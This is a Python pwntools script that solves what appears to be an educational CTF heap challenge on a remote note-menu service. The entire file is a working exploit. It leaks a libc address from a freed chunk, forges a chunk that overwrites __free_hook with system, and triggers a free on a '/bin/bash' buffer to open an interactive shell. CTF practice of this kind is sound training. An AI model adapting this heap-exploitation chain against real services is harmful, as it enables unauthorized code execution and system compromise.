from pwn import *

r = remote("edu-ctf.zoolab.org", "10007")

note = set()
del_note = set()

def instrucion():
    for i in range(5): r.recvline()

def add(id, name):
    instrucion()
    print("add")
    r.sendline('1')
    r.recvline()
    r.sendline(str(id))
    r.recvline()
    r.sendline(name)
    r.recvline()

def edit(id, size, s):
    note.add(id)
    instrucion()
    print("edit")
    r.sendline('2')
    r.recvline()
    r.sendline(str(id))
    r.recvline()
    r.sendline(str(size))
    r.sendline(s)
    r.recvline()

def delete(id):
    note.remove(id)
    del_note.add(id)
    instrucion()
    print("delete")
    r.sendline('3')
    r.recvline()
    r.sendline(str(id))
    r.recvline()

def show():
    instrucion()
    print("show")
    r.sendline('4')
    data = []
    for i in range(len(note)*4 + len(del_note)*2): 
        r.recvline()
    return data

add(0, 'A'*8)
edit(0, 0x418, 'A')#1048

add(1, 'B'*8)
edit(1, 0x18, 'B')

add(2, 'C'*8)

delete(0)

#show()
instrucion()
r.sendline('4')
r.recvuntil('data')

libc = u64(r.recv(15).split()[1].ljust(8, b'\x00')) - 0x1ecbe0

free_hook = p64(libc + 0x1eee48)
system = libc + 0x52290
info(f"libc: {hex(libc)}")

data = b'/bin/bash\x00'.ljust(0x10, b'\x00')
fake_chunk = b'\x00'*8 + p64(0x21) + b'C'*16 + free_hook

edit(1, 0x38, data + fake_chunk)
edit(2, 8, p64(system))

show()
delete(1)
r.interactive()